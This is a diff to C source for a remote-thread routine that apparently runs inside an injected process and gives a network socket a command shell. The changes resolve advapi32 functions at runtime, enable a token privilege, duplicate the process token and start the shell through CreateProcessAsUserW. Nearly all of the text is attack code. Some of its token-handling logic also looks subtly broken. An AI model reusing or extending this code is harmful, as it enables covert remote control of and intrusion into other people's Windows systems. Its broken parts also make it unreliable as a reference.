@@ -10,12 +10,11 @@ LPTHREAD_START_ROUTINE RemoteThreadRoutine(LPVOID lpParameter)
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 	SECURITY_ATTRIBUTES sa;
-	HPCON hpc;
+	LUID luid;
+	TOKEN_PRIVILEGES tp;
 	LPVOID lpRemoteConsoleProcessHandle;
-	HANDLE hReturnConsoleProcess, hPseudoCurrentProcess, hCurrentProcess, hInputThread, hOutputThread, hInputRead, hInputWrite, hOutputRead, hOutputWrite;
-	HMODULE hWs2_32Dll;
-	LPOPEN_PROCESS_TOKEN OpenProcessTokenF;
-	LPADJUST_TOKEN_PRIVILEGES AdjustTokenPrivilegesF;
+	HANDLE hReturnConsoleProcess, hPseudoCurrentProcess, hToken, hDupToken, hInputThread, hOutputThread, hInputRead, hInputWrite, hOutputRead, hOutputWrite;
+	HMODULE hWs2_32Dll, hAdvapi32Dll;
 	DWORD timeout;
 	SOCKET shell;
 	struct sockaddr_in shell_addr;
@@ -39,28 +38,33 @@ LPTHREAD_START_ROUTINE RemoteThreadRoutine(LPVOID lpParameter)
 	sa.bInheritHandle = TRUE;
 
 	hPseudoCurrentProcess = rtd->GetCurrentProcess();
-	res = rtd->ttd.OpenProcessToken(hPseudoCurrentProcess, TOKEN_ADJUST_PRIVILEGES, &hCurrentProcess);
-	if (res == FALSE)
-		goto lFailed;
-	res = rtd->ttd.AdjustTokenPrivileges(hCurrentProcess, FALSE, rtd->ttd.pTp, 0, NULL, NULL);
-	if (res == FALSE)
-		goto lFailed;
 
-	res = rtd->CreatePipe(&hInputRead, &hInputWrite, &sa, 0);
-	if (res == FALSE)
-		goto lFailed;
-	res = rtd->CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0);
-	if (res == FALSE)
-		goto lFailed;
-	res = rtd->SetHandleInformation(hInputWrite, HANDLE_FLAG_INHERIT, 0);
-	if (res == FALSE)
-		goto lFailed;
-	res = rtd->SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
-	if (res == FALSE)
+	hAdvapi32Dll = rtd->LoadLibraryW(rtd->ttd.lpAdvapi32DllName);
+	if (hAdvapi32Dll == NULL)
 		goto lFailed;
 
 	hWs2_32Dll = rtd->LoadLibraryW(rtd->ctd.lpWS2_32DllName);
 	if (hWs2_32Dll == NULL)
+		goto lFailed;
+
+	rtd->ttd.OpenProcessToken = rtd->GetProcAddress(hAdvapi32Dll, rtd->ttd.lpOpenProcessToken);
+	if (rtd->ttd.OpenProcessToken == NULL)
+		goto lFailed;
+
+	rtd->ttd.AdjustTokenPrivileges = rtd->GetProcAddress(hAdvapi32Dll, rtd->ttd.lpAdjustTokenPrivileges);
+	if (rtd->ttd.AdjustTokenPrivileges == NULL)
+		goto lFailed;
+
+	rtd->ttd.DuplicateTokenEx = rtd->GetProcAddress(hAdvapi32Dll, rtd->ttd.lpDuplicateTokenEx);
+	if (rtd->ttd.DuplicateTokenEx == NULL)
+		goto lFailed;
+
+	rtd->CreateProcessAsUserW = rtd->GetProcAddress(hAdvapi32Dll, rtd->lpCreateProcessAsUserW);
+	if (rtd->CreateProcessAsUserW == NULL)
+		goto lFailed;
+
+	rtd->ttd.LookupPrivilegeValueW = rtd->GetProcAddress(hAdvapi32Dll, rtd->ttd.lpLookupPrivilegeValueW);
+	if (rtd->ttd.LookupPrivilegeValueW == NULL)
 		goto lFailed;
 
 	rtd->ctd.WsaStartup = rtd->GetProcAddress(hWs2_32Dll, rtd->ctd.lpWSAStartupName);
@@ -77,6 +81,43 @@ LPTHREAD_START_ROUTINE RemoteThreadRoutine(LPVOID lpParameter)
 
 	rtd->ctd.Select = rtd->GetProcAddress(hWs2_32Dll, rtd->ctd.selectName);
 	if (rtd->ctd.Select == NULL)
+		goto lFailed;
+
+	res = rtd->ttd.LookupPrivilegeValueW(NULL, rtd->ttd.lpAssignPrimaryTokenPrivilege, &luid);
+	if (res == FALSE)
+		goto lFailed;
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	tp.Privileges[0].Luid = luid;
+
+	res = rtd->ttd.OpenProcessToken(hPseudoCurrentProcess, TOKEN_ALL_ACCESS, &hDupToken);
+	if (res == FALSE)
+		goto lFailed;
+
+	res = rtd->ttd.AdjustTokenPrivileges(hDupToken, FALSE, &tp, 0, NULL, NULL);
+	if (res == FALSE)
+		goto lFailed;
+
+	res = rtd->ttd.DuplicateTokenEx(hDupToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
+	if (res == FALSE)
+		goto lFailed;
+
+	res = rtd->ttd.AdjustTokenPrivileges(hDupToken, FALSE, rtd->ttd.pTp, 0, NULL, NULL);
+	if (res == FALSE || res == ERROR_NOT_ALL_ASSIGNED)
+		goto lFailed;
+
+	res = rtd->CreatePipe(&hInputRead, &hInputWrite, &sa, 0);
+	if (res == FALSE)
+		goto lFailed;
+	res = rtd->CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0);
+	if (res == FALSE)
+		goto lFailed;
+	res = rtd->SetHandleInformation(hInputWrite, HANDLE_FLAG_INHERIT, 0);
+	if (res == FALSE)
+		goto lFailed;
+	res = rtd->SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
+	if (res == FALSE)
 		goto lFailed;
 
 	rtd->ctd.WsaStartup(WINSOCK_VERSION, &wsaData);
@@ -113,7 +154,8 @@ LPTHREAD_START_ROUTINE RemoteThreadRoutine(LPVOID lpParameter)
 	rtd->hInputThread = hInputThread;
 	rtd->hOutputThread = hOutputThread;
 
-	res = rtd->CreateProcessW(
+	res = rtd->CreateProcessAsUserW(
+		hDupToken,
 		NULL,
 		rtd->lpCommandLine,
 		NULL,
